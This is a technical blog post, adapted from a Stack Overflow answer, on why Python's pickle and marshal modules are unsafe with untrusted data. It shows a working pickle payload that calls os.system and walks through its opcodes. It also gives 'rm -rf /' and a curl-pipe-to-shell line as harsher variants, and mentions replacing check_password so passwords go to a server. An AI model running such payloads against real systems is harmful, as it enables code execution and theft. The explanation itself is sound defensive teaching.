---
layout: post
title: "Security of Python’s pickle and marshal modules"
---

<em class="hatnote">This is modified from my answer at Stack Overflow:
<a href="http://stackoverflow.com/q/26931919/660921">Marshal unserialization -
not secure</a>.</em>

Both the [`pickle`][pickle] and [`marshal`][marshal] modules come with a similar
big red warning:

> The pickle module is not secure against erroneous or maliciously constructed
> data. Never unpickle data received from an untrusted or unauthenticated
> source.

<!-- -->

> The marshal module is not intended to be secure against erroneous or
> maliciously constructed data. Never unmarshal data received from an untrusted
> or unauthenticated source.

Lets see why.

Marshal
-------

There are no **known** ways to exploit `marshal`. Executing code when using
`marshal.loads()` is not something I was able to do, and looking at the
`marhal.c` source code, I don't see an immediately obvious way.

So why is this warning here? [The BDFL explains][bfdl]:

> BTW the warning for marshal is legit -- the C code that unpacks marshal data
> has not been carefully analyzed against buffer overflows and so on. Remember
> the first time someone broke into a system through a malicious JPEG? The same
> could happen with marshal. Seriously.

I recommend you read the rest of the discussion; a bug is shown where
unmarshaling data causes Python to segfault; this has been fixed since Python
2.5 (this bug can, potentially, be abused to execute code). Other bugs *may*
still exist, though!

Furthermore, the `marshal` docs mention:

> This is not a general “persistence” module. [..]  The marshal module exists
> mainly to support reading and writing the “pseudo-compiled” code for Python
> modules of .pyc files.

So it's not even designed to persist data in a reliable way.

Pickle
------

You can easily execute arbitrary code with `pickle`. For example:

    >>> import pickle
    >>> pickle.loads(b"cos\nsystem\n(S'ls /'\ntR.")
    bin   data  download  home  lib64       mnt  proc  run   srv  tmp     usr      var
    boot  dev   etc       lib   lost+found  opt  root  sbin  sys  ubuntu  vagrant
    0

This is a harmless `ls /`, but can also be a less harmless `rm -rf /`, or a
`curl http://example.com/hack.sh | sh`.

You can see how this works by using the `pickletools` module:

    >>> import pickletools
    >>> pickletools.dis(b"cos\nsystem\n(S'ls /'\ntR.")
        0: c    GLOBAL     'os system'
       11: (    MARK
       12: S        STRING     'ls /'
       20: t        TUPLE      (MARK at 11)
       21: R    REDUCE
       22: .    STOP

`pickle.py` has some comments on what these opcodes mean:

    GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
    MARK           = b'('   # push special markobject on stack
    STRING         = b'S'   # push string; NL-terminated string argument
    TUPLE          = b't'   # build tuple from topmost stack items
    REDUCE         = b'R'   # apply callable to argtuple, both on stack
    STOP           = b'.'   # every pickle ends with STOP

Most of it is self-explanatory; with `GLOBAL` you can get any function, and
with `REDUCE` you call it.

Since Python is pretty dynamic, you can also use this to monkey-patch a program
in run-time. For example, you can change the `check_password` function with one
where you upload the password to a server.

So what *is* secure?
--------------------

XML, json, MessagePack, ini files, or perhaps something else. It depends on
which format is the best in your situation.

Has this code been "carefully analyzed against buffer overflows and so on"? Who
knows. Most code hasn't, and C makes it easy to do things wrong.[^1] Even Python
code may be vulnerable, as it [may call functions implemented in C that are
vulnerable](http://www.cvedetails.com/product/18230/Python-Python.html?vendor_id=10210).

There [have been problems with Python's JSON module][json-cve]. But at the same
time, it's used a lot in public-facing apps, so it's *probably* safe. It'll
certainly be safer than `marshal`, since this was only designed for `.pyc` files
and explicitly comes with a "not audited!" warning.

This is no guarantee. Remember that [YAML security hole a few years back that
caused every Ruby on Rails application in the world to be vulnerable to
arbitrary code execution][yaml-oops]. Oops! And this wasn't even a subtle buffer
overflow, but a much more obvious problem.

You should *not* use [yaml][yaml]'s `load()` method, as this has [the same
problems as Ruby's YAML][no-yaml]. Use `safe_load()` instead.

Conclusion
----------

The warning in the `pickle` module is very much warranted (it should be stated
stronger), while the warning above the `marshal` module is more of a "*this code
was not designed with security in mind*"-type of warning, but actually
exploiting it is not as easy and relies on the hypothetical existence on unknown
bugs. Still, you're probably better off using something else.

[^1]: There really ought to be a "carefully analyzed against buffer overflows and so on" seal of trust for open source projects. Yeah, you can shelf out the big bucks and get your code analyzed by Veracode and such, but this is not feasible for open source projects. There is *some* effort to do this after the OpenSSL Heartbleed clusterfuck a few years ago in the form of the [Core Infrastructure Initiative](https://en.wikipedia.org/wiki/Core_Infrastructure_Initiative), but its scope and budget are limited (but it's young, and may gain traction in a few years).

[marshal]: https://docs.python.org/3/library/marshal.html
[pickle]: https://docs.python.org/3/library/pickle.html
[yaml]: http://pyyaml.org/
[yaml-oops]: http://www.kalzumeus.com/2013/01/31/what-the-rails-security-issue-means-for-your-startup/
[no-yaml]: http://nedbatchelder.com/blog/201302/war_is_peace.html
[json-cve]: https://access.redhat.com/security/cve/CVE-2014-4616
[bfdl]: http://grokbase.com/t/python/python-ideas/083532w3t7/an-official-complaint-regarding-the-marshal-and-pickle-documentation#20080305gvdndfl4m3f2u6cmpxvrclfcou
